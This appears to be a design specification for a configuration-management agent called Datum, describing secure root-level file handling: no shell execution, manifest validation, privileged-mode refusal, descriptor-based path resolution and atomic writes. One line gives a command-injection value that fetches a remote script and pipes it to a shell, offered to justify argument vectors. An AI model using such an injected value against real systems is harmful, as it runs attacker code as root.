# Applying state safely

A provider runs as root and acts on paths and names that came from a file. This page specifies the
handling required to keep that from becoming a local privilege escalation.

!!! note "Proposed behaviour"

    These are requirements on providers. Nothing is implemented yet. The path handling is specified
    in detail here because it is the hardest part to retrofit.

## No shell

A provider invokes a program with an argument vector. Command lines are never assembled and passed
to a shell.

```text
exec("apt-get", ["apt-get", "install", "-y", name])     required
system("apt-get install -y " + name)                    forbidden
```

With an argument vector, a package name of `nginx; curl http://host/x | sh` is passed to
`apt-get` as one argument and fails as an unknown package. With a shell, it is two commands and
the second one runs as root.

The rule applies to providers alone. No component above the provider boundary executes programs.

## Field validation happens when the manifest loads

Validation happens as documents load, which keeps one set of rules for every provider. A bad value
is a manifest error raised before the host is read.

Two layers of checking apply.

The universal layer applies regardless of distribution.

| Rule | Applies to |
| ---- | ---------- |
| No NUL or ASCII control characters | Every string field |
| Letters, digits, and dot, hyphen, underscore or plus only | Names and keys |
| No `/` | Package, service, user and group names |
| Must be absolute | Paths |
| No `..` or empty component | Paths |
| Normalised to NFC, no bidirectional formatting controls | Every string field |
| Length bounded, 4096 bytes for a path and 256 for a name | Every string field |

Two of those rows have more behind them. Names and keys are restricted to an allowed set, being
letters, digits, and the four characters dot, hyphen, underscore and plus. Anything a shell or a
package manager could interpret falls outside that set. String fields are length-bounded at 4096
bytes for a path and 256 for a name.

The set is defined by what it allows. A character is refused until it is added to the set, so a
character nobody considered is already excluded.

Text is normalised to Unicode NFC before comparison, and bidirectional formatting controls are
rejected. A resource name that renders in review as one thing and compares as another would make the
diff unreliable, and [review of the
diff](threat-model.md#an-attacker-who-can-merge-to-the-repository) is the control that applies to a
repository writer.

The per-distribution layer belongs to providers, where the rules differ. Debian package names permit
a narrower character set than RPM names do. A provider that rejects a name its package manager would
not accept reports the problem in terms of the resource.

### Modes that grant privilege

A `mode` is four digits wide, and the leading digit is the one refused by default.

| Declared mode | Behaviour |
| ------------- | --------- |
| `0644`, `0600`, `0750` | Applied. |
| `04755`, `02755` | Refused unless the resource sets `allowPrivileged: true`. |
| `0666`, `0777` on a path under `/etc`, `/usr`, `/bin`, `/sbin` or `/lib` | Refused unless the resource sets `allowPrivileged: true`. |

Setting the setuid bit on a binary grants root, and a world-writable file in a system directory
grants it one step later. Both are four characters of desired state, both apply successfully, and
neither reads as a privilege grant in a diff.
[ADR-0011](../adr/0011-no-command-execution-from-desired-state.md) removed command execution from
desired state, and mode bits are the remaining way to arrange it.

```yaml
desired:
  path: /usr/local/bin/helper
  owner: root
  group: root
  mode: "04755"
  allowPrivileged: true
```

Setuid binaries are occasionally legitimate, so the control requires a second field rather than
refusing outright. The field puts the intent in the diff as a word.
[`unsigned`](../resources/types/repository.md#unsigned-sources-are-declared-never-implied) on a
package source works the same way.

A refusal is counted as `unsafe-mode` by [the refusal
counter](../observability/metrics.md#security-controls), so the attempt is visible to the fleet and
not only to the repository author.

The table names the dangerous classes and leaves the exact pattern to each provider, so no single
distribution's rules are applied everywhere.

## Resolving a managed path

An unprivileged user who can create entries in a directory Datum writes to is in a position to
redirect a root write. The resolution below closes that.

The path is resolved once per pass and every subsequent operation uses the resulting directory
descriptor, never the path string.

1. The parent directory is resolved and held open as a file descriptor.
2. Its device and inode numbers are recorded in the plan.
3. The final component is opened relative to that descriptor with `O_NOFOLLOW`, so a symbolic link
   in the position being managed is an error and not something followed.
4. At apply time the descriptor is confirmed to still refer to the recorded device and inode before
   anything is written.
5. Every operation uses the descriptor, so `openat`, `renameat`, `fchown` and `fchmod` in place of
   their path-based equivalents.

The held descriptor closes the window between deciding and acting. A path string re-resolved at
apply time can resolve somewhere else. A descriptor continues to refer to the directory that was
inspected.

The final component is never followed as a symbolic link.

Intermediate components are treated differently. Refusing symbolic links anywhere in a path would
break ordinary systems where `/var/run` points at `/run`, so intermediate links are followed. A link
substituted mid-chain during resolution is not prevented the way one at the final component is.

The chain is resolved one component at a time, which bounds that exposure.

```text
openat2(parent, component, RESOLVE_BENEATH|RESOLVE_NO_MAGICLINKS)
```

Each component is opened relative to the descriptor for the one above it, so the walk cannot escape
the prefix it started from, and `/proc` and `/sys` magic links cannot be traversed. Fleets setting
[`trust.strictPaths`](#untrusted-path-components) get `RESOLVE_NO_SYMLINKS`, which refuses
intermediate links as well.

The residual exposure is a directory a non-root user can write to somewhere in the chain. That case
is [reported](#untrusted-path-components) rather than prevented.

## Writing a file

```text
openat(parent, ".datum.tmp.XXXX", O_CREAT|O_EXCL|O_WRONLY)
fchown(fd, owner, group)
fchmod(fd, mode)
write(fd, content)
fsync(fd)
renameat(parent, ".datum.tmp.XXXX", parent, "nginx.conf")
```

`O_EXCL` means the temporary file cannot be an existing file or a symbolic link planted in
advance. Ownership and mode are set on the descriptor before any content is written, so the file
is never briefly readable by the wrong user. The rename is atomic within the directory, so a
concurrent reader sees either the old content or the new content.

The temporary file is created in the target directory. A rename across filesystems is not atomic,
and `/tmp` is frequently a different filesystem.

### Not a regular file

`O_NOFOLLOW` refuses a symbolic link and nothing else. A named pipe planted at a managed path is not
a link, so the open succeeds and then blocks waiting for a reader. A device node is opened as a
device.

```text
openat(parent, name, O_WRONLY|O_NOFOLLOW|O_NONBLOCK)
fstat(fd)  ->  refuse unless S_ISREG
```

`O_NONBLOCK` keeps the open from hanging. The `fstat` is taken on the resulting descriptor, so the
check and the write apply to the same object. A provider that stat'd the path and then opened it
would be checking one thing and acting on another.

### Durability and leftovers

`fsync` on the file is not sufficient on its own. The directory entry created by the rename needs
`fsync` on the parent descriptor, or a crash can leave the new content written and the name still
pointing at the old inode.

Temporary names are random, and a collision on `O_EXCL` is retried with a new name. A `.datum.tmp.*`
file older than one pass is removed at the start of the next pass. A crash between create and rename
leaves one behind, and its content stays readable until it is cleaned up.

### Metadata a rename does not carry

Writing through a temporary file and renaming replaces the inode, so anything attached to the old inode
and not set explicitly is lost.

| Attribute | Behaviour |
| --------- | --------- |
| Owner, group, mode | Set explicitly on the descriptor before the rename. |
| Extended attributes | Copied from the file being replaced, where one exists. |
| POSIX ACLs | Copied from the file being replaced, where one exists. |
| SELinux label | Set from the policy's default for the target path, not copied. |
| File capabilities | Not preserved, and a file carrying them is refused, never silently stripped. |

Extended attributes and ACLs are copied, so a host whose files carry ACLs nobody declared keeps
working. File capabilities are handled differently. A capability is a privilege grant Datum does not
model, so a file carrying one is refused and the grant is neither reapplied nor dropped without a
report.

SELinux labels come from policy and not from the file being replaced. A copied label would preserve
a mislabel indefinitely.

!!! note "Open question"

    Whether extended attributes, ACLs and SELinux labels should be declarable fields is undecided.
    Declaring them would make them reviewable and their drift detectable. It would also add a large
    number of fields that most repositories never set.

## Creating a directory

```text
mkdirat(parent, "conf.d", 0700)
openat(parent, "conf.d", O_DIRECTORY|O_NOFOLLOW)
fchown(fd, owner, group)
fchmod(fd, mode)
```

The directory is created restrictively and widened afterwards. Creating it with the declared mode
directly would leave a window between `mkdirat` and `fchown` in which a world-readable directory
exists owned by root, and anything placed in it during that window remains after the ownership
changes.

The umask is set explicitly and never inherited. An inherited umask would make identical desired
state produce different results on different machines.

Missing intermediate directories are not created. A `Directory` at `/srv/app/data` whose parent does
not exist fails, and `/srv/app` is not created with ownership and a mode nobody declared. Whether
that should remain the behaviour is [an open
question](../resources/types/directory.md#contents-are-not-managed).

## Removing something

```text
unlinkat(parent, name, 0)                  a file or a symbolic link
unlinkat(parent, name, AT_REMOVEDIR)       a directory
```

Both forms act on a name within a held descriptor and neither follows a symbolic link, so a removal
cannot be redirected the way an `unlink` on a path string can.

A removal is refused when what is found does not match what the resource claims to manage. A `File`
declared absent at a path now holding a directory removes nothing and reports what it found. The
type forms part of the resource's [target identity](../resources/identity.md).

Directory removal is never recursive. `AT_REMOVEDIR` fails on a non-empty directory and the failure
is reported. Removing a tree would remove things nobody declared, which [declared-only
ownership](../adr/0009-declared-only-ownership.md) forbids.

## Recursive operations

There are none.

No field applies ownership or a mode to a directory's contents, and nothing walks a tree. A
recursive `chown` or `chmod` as root is the classic symbolic-link escalation. Walking a tree while
an unprivileged user creates links inside it requires either following a link and acting outside the
tree, or holding a descriptor per level and rechecking each one.

A fleet needing every file in a directory to have one owner declares each file. Where the set of
files is not known in advance, that is [the purging
problem](../resources/types/directory.md#purging-undeclared-contents), which is unresolved.

!!! note "Open question"

    Whether a bounded recursive form should exist, applying only to a single directory level and
    refusing to descend through a symbolic link, is undecided. It would cover the common case of a
    drop-in directory, and it would reopen a class of bug that the current omission closes.

## Hard links

An unprivileged user can create a hard link, in a directory they control, to a file they cannot
read. A resource that then changes ownership or mode on that path grants them access to the
original file.

A provider refuses to change ownership or mode on a path whose link count is greater than one,
unless the resource also manages the file's content, and reports the refusal instead of proceeding.

The count is read with `fstat` on the descriptor already held for the file, never with `stat` on the
path. Reading it from the path would mean checking one file and modifying another.

Legitimately hard-linked system files exist, so the refusal is per-resource. That resource is
`failed`, its dependents are blocked, and everything unrelated to it continues. Where the resource
manages content, the file is replaced by a rename, which breaks the link instead of writing through
it.

## Untrusted path components

A path that passes through a directory writable by someone other than root is reachable by that
user, and a resource under it is exposed to the races above even when every mitigation is
applied correctly.

Datum reports it. Each component of a managed path is checked, and a resource whose path passes
through a directory owned by a non-root user, or writable by group or other, is marked in the
plan.

```text
update   File[app-config]
         path      /var/lib/app/conf/app.yaml
         warning   /var/lib/app/conf is writable by uid 1001
```

A component counts as untrusted when it is owned by a user other than root, or is writable by group
or other without the sticky bit set, or carries an ACL granting write to anyone but root. The sticky
bit is part of the test because `/tmp` and `/var/tmp` are world-writable by design.

Each component is tested through the descriptor held during [path
resolution](#resolving-a-managed-path), not by re-examining the path, for the same reason the
hard-link count is.

`trust.strictPaths: true` turns that warning into a refusal, counted as `untrusted-path` by [the
refusal counter](../observability/metrics.md#security-controls). The default is to warn, since the
situation is common and often legitimate.

!!! note "Important limitation"

    Warning by default means the control detects without preventing, so the class of attack it
    addresses remains open on a fleet that has not enabled `trust.strictPaths`.

## Reports and content disclosure

A plan can contain the content of a file, so a report written where other local users can read
it discloses that content to them.

Reports are written under `state`, which is `/var/lib/datum` by default, with the directory at
mode `0700` and files at mode `0600`, both owned by root.

The agent checks that at startup and refuses to run when it finds otherwise. A state directory
somebody widened discloses plans, and one that is writable by a non-root user allows that user to
reset the [accepted revision](repository-trust.md#verifying-that-a-revision-is-current) and re-pin
the host at an older signed revision. Correcting the permissions silently would conceal that either
had been possible.

Content is recorded as a digest, never as text. A readable difference is rendered to a terminal on
request and is never written to a report.

## Marking content as sensitive

A file whose content should not be rendered at all can say so.

```yaml
datum: v1alpha1
type: File
name: app-credentials

desired:
  path: /etc/app/credentials
  owner: app
  group: app
  mode: "0600"
  source: files/credentials
  sensitive: true
```

With `sensitive: true`, the plan reports that the content differs and never shows it, on a terminal
or anywhere else. Ownership and mode are still reported normally.

!!! note "Important limitation"

    This is not secret management. The content still sits in the repository in plain text and is
    still readable by every host. The flag stops the content being echoed into output and reports,
    and it does nothing about where the content came from. The field is named after the handling it
    requests rather than after the thing it holds.

## Confining content sources

A `File` resource reads its content from `desired.source`, which is a path in the repository. An
unconfined source path would let a resource read anything the agent can read and write it to a
host.

A source path must be relative, is resolved against the directory containing its layer, and the
result has to remain inside the fleet root, meaning the directory holding the `Fleet` document.

Containment is enforced by opening the path through a descriptor for the fleet root with
`RESOLVE_BENEATH`. A comparison of resolved strings is decided before the file is opened, so the
path can change in between, and on a case-insensitive filesystem the comparison can be wrong in any
case.

`.git` is excluded explicitly. It sits inside the fleet root, so containment alone would permit a
`source` of `.git/config`.

Sources are bounded by [`source.maxSourceSize`](repository-fetch.md#limits). Without the bound, a
resource pointing at a very large blob would be read into memory and written to a host that may not
have room for it.

The case this covers is a repository with path-based ownership, where somebody is trusted with one
subdirectory and not with the whole fleet. Without confinement, write access to any layer is
equivalent to read access to every file the agent can reach.
